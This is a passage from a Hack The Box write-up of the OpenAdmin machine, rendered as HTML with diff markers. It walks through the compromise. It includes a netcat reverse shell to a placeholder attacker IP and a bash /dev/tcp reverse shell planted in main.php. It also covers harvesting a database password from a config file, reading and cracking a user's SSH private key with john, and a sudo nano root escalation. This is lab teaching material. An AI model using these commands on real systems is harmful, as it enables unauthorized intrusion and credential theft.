+<p>Before we go ahead and do that let’s try and gain a <em>netcat</em> connection so we can upgrade our shell. The <em>nc</em> we have access to doesn’t support the <code class="highlighter-rouge">-e</code> option so we will have to do some shell redirect magic.</p>
+
+<p>First off we will set our <em>netcat</em> listener on our attacker machine:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-nvlp</span> 1234</code></pre></figure>
+
+<p>We then run the following commands on the victim to receive our connection:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">mknod</span> /tmp/backpipe p<span class="p">;</span>/bin/sh <span class="nt">-c</span> <span class="s2">"/bin/sh 0&lt;/tmp/backpipe | nc &lt;attacker-ip&gt; 1234 1&gt;/tmp/backpipe"</span></code></pre></figure>
+
+<p>From here we can <a href="/writeups/pentesting-cheatsheets/privilege-escalation/linux/#upgrade-shell">upgrade our shell</a> taking note that the victim machine only has <code class="highlighter-rouge">python3</code> installed.</p>
+
+<h2 id="user">User</h2>
+
+<p>Now we can see what other users we have and check their directory permissions while we are at it:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> <span class="nt">-l</span> /home
+total 8
+drwxr-x--- 5 jimmy  jimmy  4096 Nov 22 23:15 jimmy
+drwxr-x--- 6 joanna joanna 4096 Nov 28 09:37 joanna</code></pre></figure>
+
+<p>So we have two users to work with!</p>
+
+<p>Because we are looking at taking over another account we will search for any information leakage like passwords, ssh keys and the likes as well as keeping an eye out for privesc to root. You just never know.</p>
+
+<p>Having a look at <em>OpenNetAdmin</em>’s files it is obvious that the web application requires a database. A quick check shows that there is <em>MySQL</em> running:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ps <span class="nt">-aux</span> | <span class="nb">grep </span>mysql
+mysql     1044  0.1 11.3 1633604 232332 ?      Sl   12:28   0:14 /usr/sbin/mysqld <span class="nt">--daemonize</span> <span class="nt">--pid-file</span><span class="o">=</span>/run/mysqld/mysqld.pid
+www-data 12798  0.0  0.0  11464  1104 pts/0    S+   14:48   0:00 <span class="nb">grep </span>mysql </code></pre></figure>
+
+<p>A search of the interweb using the term <code class="highlighter-rouge">opennetadmin database password</code> reveals some info that might be of use <a href="http://opennetadmin.com/forum_archive/4/t-85.html">here</a>.</p>
+
+<p>Let’s check out the file mentioned:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">grep </span>passwd /opt/ona/www/local/config/database_settings.inc.php
+<span class="s1">'db_passwd'</span> <span class="o">=&gt;</span> <span class="s1">'n1....0R!'</span>,</code></pre></figure>
+
+<p>We find a password! Let’s give <code class="highlighter-rouge">ssh</code> a try and see if we get access:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh jimmy@openadmin.htb
+jimmy@openadmin.htbs password: 
+jimmy@openadmin:~<span class="err">$</span></code></pre></figure>
+
+<p>On inspection of <code class="highlighter-rouge">jimmy</code>’s home folder we see that there is no <code class="highlighter-rouge">user.txt</code> file. This means we are going to neeed to gain access to <code class="highlighter-rouge">joannas</code> account.</p>
+
+<p>Let’s see where <code class="highlighter-rouge">jimmy</code> has read and write access:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">find / <span class="nt">-regextype</span> posix-extended <span class="nt">-regex</span> <span class="s2">"/(sys|srv|proc|run)"</span> <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-user</span> &lt;username&gt; <span class="nt">-ls</span> 2&gt;&amp;1 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Permission denied"</span>
+				.......................... snip ..........................
+   286763      4 drwxrwx---   2 jimmy    internal     4096 Jan  5 12:46 /var/www/internal
+   282830      4 <span class="nt">-rwxrwxr-x</span>   1 jimmy    internal      389 Jan  5 12:46 /var/www/internal/main.php
+     2644      4 <span class="nt">-rwxrwxr-x</span>   1 jimmy    internal      185 Nov 23 16:37 /var/www/internal/logout.php
+     1387      4 <span class="nt">-rwxrwxr-x</span>   1 jimmy    internal     3229 Nov 22 23:24 /var/www/internal/index.php
+				.......................... snip ..........................</code></pre></figure>
+
+<p>Taking a look at these files we see that <code class="highlighter-rouge">index.php</code> is a login page that seems to accept the username and password of <code class="highlighter-rouge">jimmy</code> and <code class="highlighter-rouge">main.php</code> has <code class="highlighter-rouge">shell_exec('cat /home/joanna/.ssh/id_rsa');</code> which would output <code class="highlighter-rouge">joanna</code>’s <em>SSH</em> key. That is exactly what we are after. We also see <code class="highlighter-rouge">Don't forget your "ninja" password</code>. Don’t worry we won’t ;)</p>
+
+<p>These files aren’t in <code class="highlighter-rouge">http://openadmin.htb</code>’s root folder. Maybe there is a vhost linking to this location that we haven’t found? Let’s check the <code class="highlighter-rouge">apache</code> config:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> <span class="nt">-l</span> /etc/apache2/sites-available/
+total 16
+<span class="nt">-rw-r--r--</span> 1 root root 6338 Jul 16 18:14 default-ssl.conf
+<span class="nt">-rw-r--r--</span> 1 root root  303 Nov 23 17:13 internal.conf
+<span class="nt">-rw-r--r--</span> 1 root root 1329 Nov 22 14:24 openadmin.conf</code></pre></figure>
+
+<p>There it is! Taking a look at <code class="highlighter-rouge">internal.conf</code> we find what we are looking for:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> /etc/apache2/sites-available/internal.conf 
+Listen 127.0.0.1:52846
+
+&lt;VirtualHost 127.0.0.1:52846&gt;
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+&lt;IfModule mpm_itk_module&gt;
+AssignUserID joanna joanna
+&lt;/IfModule&gt;
+
+    ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
+    CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
+
+&lt;/VirtualHost&gt;</code></pre></figure>
+
+<p>We see that apache is listening on <code class="highlighter-rouge">127.0.0.1:52846</code> and a quick <code class="highlighter-rouge">curl -u jimmy:n1....0R! 127.0.0.1:52846</code> outputs the contents of <code class="highlighter-rouge">index.php</code>.</p>
+
+<p>Running <code class="highlighter-rouge">main.php</code> we see that <code class="highlighter-rouge">joanna</code>’s <em>SSH</em> key is printed:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">-u</span> jimmy:n1....0R! 127.0.0.1:52846/main.php
+&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+            .... SNIP ....        ....SNIP....
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+&lt;/pre&gt;&lt;html&gt;
+&lt;h3&gt;Dont forget your <span class="s2">"ninja"</span> password&lt;/h3&gt;
+Click here to <span class="nb">logout</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"logout.php"</span> tite <span class="o">=</span> <span class="s2">"Logout"</span><span class="o">&gt;</span>Session
+&lt;/html&gt;</code></pre></figure>
+
+<h3 id="path-1---ssh-key">Path 1 - SSH Key</h3>
+
+<p>Since we have <code class="highlighter-rouge">joanna</code>’s <em>SSH</em> key we can try cracking it. Copy the key to a file on the attacker machine such as <code class="highlighter-rouge">id_rsa</code>.</p>
+
+<p>We will then convert the key to a crackable hash:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh2john id_rsa <span class="o">&gt;</span> id_rsa-hash</code></pre></figure>
+
+<p>We can then try cracking it with <code class="highlighter-rouge">john</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">john <span class="nt">--wordlist</span><span class="o">=</span>/root/wordlists/passwords/passwords.txt id_rsa-hash
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
+finding a possible candidate.
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+bl....as      <span class="o">(</span>/root/Documents/openadmin/id_rsa-joanna<span class="o">)</span>
+Warning: Only 2 candidates left, minimum 4 needed <span class="k">for </span>performance.
+1g 0:00:00:10 DONE <span class="o">(</span>2020-01-14 18:21<span class="o">)</span> 0.09596g/s 1376Kp/s 1376Kc/s 1376KC/sa6_123..<span class="k">*</span>7¡Vamos!
+Session completed</code></pre></figure>
+
+<p>NOTE: I don’t use just <code class="highlighter-rouge">rockyou.txt</code>. The <code class="highlighter-rouge">passwords.txt</code> is a custom created wordlist made from multiple wordlists stripped of all duplicates. You may need to do the same!</p>
+
+<p>We retrieve the <em>SSH</em> passphrase <code class="highlighter-rouge">bl....as</code> and can now login via <em>SSH</em> using the <code class="highlighter-rouge">id_rsa</code> key:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh <span class="nt">-i</span> id_rsa-joanna joanna@openadmin.htb
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa-joanna'</span>:
+Last login: Tue Jan 14 18:20:08 2020 from 10.10.14.64
+joanna@openadmin:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span>,1002<span class="o">(</span>internal<span class="o">)</span></code></pre></figure>
+
+<h3 id="path-2---alter-script">Path 2 - Alter Script</h3>
+
+<p>With this script we have command execution as <code class="highlighter-rouge">joanna</code> so all we have to do is grab a shell.</p>
+
+<p>So we will edit <code class="highlighter-rouge">main.php</code> and replace <code class="highlighter-rouge">cat /home/joanna/.ssh/id_rsa</code> with <code class="highlighter-rouge">/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/1234 0&gt;&amp;1'</code>.</p>
+
+<p>Then we setup our <em>netcat</em> listener on our attacker machine:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lvp</span> 1234</code></pre></figure>
+
+<p>Now let’s try running <code class="highlighter-rouge">main.php</code> using <code class="highlighter-rouge">jimmy</code>’s username and password:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">-u</span> jimmy:n1....0R! 127.0.0.1:52846/main.php</code></pre></figure>
+
+<p>Back at our listener we should receive a connection:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.10.171.
+Ncat: Connection from 10.10.10.171:42950.
+joanna@openadmin:/var/www<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>joanna<span class="o">)</span>,1002<span class="o">(</span>internal<span class="o">)</span></code></pre></figure>
+
+<p>Now we can go for our user flag:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">joanna@openadmin:/var/www<span class="nv">$ </span><span class="nb">cat</span> /home/joanna/user.txt
+c9b2cf07d4....60f0c81b5f</code></pre></figure>
+
+<p>And there we have it! We have our <code class="highlighter-rouge">user.txt</code>.</p>
+
+<h2 id="root">Root</h2>
+
+<p>Let’s check to see if we have any <code class="highlighter-rouge">sudo</code> privileges.</p>
+
+<p>If we used <code class="highlighter-rouge">Path 2</code> and altered the script then we find that we receive the following error:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span>: PERM_ROOT: setresuid<span class="o">(</span>0, <span class="nt">-1</span>, <span class="nt">-1</span><span class="o">)</span>: Operation not permitted
+<span class="nb">sudo</span>: unable to initialize policy plugin</code></pre></figure>
+
+<p>We can create an <code class="highlighter-rouge">ssh</code> key pair and throw the public key in <code class="highlighter-rouge">/home/joanna/.ssh/authorized_keys</code> then we can login via <code class="highlighter-rouge">ssh</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>joanna on openadmin:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User joanna may run the following commands on openadmin:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/nano /opt/priv</code></pre></figure>
+
+<p>We see that we can run <code class="highlighter-rouge">nano</code> with <code class="highlighter-rouge">sudo</code> and without a password to open the file <code class="highlighter-rouge">/opt/priv</code>. Since <code class="highlighter-rouge">nano</code> is a <a href="https://gtfobins.github.io/gtfobins/nano/">GTFOBin</a> we will be able to gain <code class="highlighter-rouge">root</code>.</p>
+
+<p>To do so we open our file with <code class="highlighter-rouge">nano</code> and then type <code class="highlighter-rouge">CTRL+R</code> and then <code class="highlighter-rouge">CTRL+X</code> to bring up the <code class="highlighter-rouge">Command to execute</code> prompt. We then type in <code class="highlighter-rouge">reset; sh 1&gt;&amp;0 2&gt;&amp;0</code> like so:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/openadmin/sudo_nano_root.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/openadmin/sudo_nano_root.png" alt="Nano GTFOBin Screenshot" class="img-fluid"></a></p>
+
+<p>That was a nice and easy root :)</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This was an interesting machine that had a fair few websites that could have sent some people on a wild goose chase. Focusing on important links like logins can be fruitful. Misconfigurations and outdated software can easily lead to a compromise in the real world. The privilege escalation to root once again outlines the issue with “ease of use” methods such as using <code class="highlighter-rouge">sudo</code> without a password. Sadly this is a common realworld situation where people attempt to automate a task that involves a script needing escalated privileges.</p>
+<!-- Hack The Box Badge -->
+          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
+      </div>
+    </div>
+    <!-- Bootstrap core JavaScript -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="/assets/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JavaScript -->
+    <script src="/assets/js/sabe.js"></script>
+    <!-- Lightbox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
+    <script>
+      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
+        event.preventDefault();
+        $(this).ekkoLightbox();
+      });
+    </script>
+  </body>
+</html>
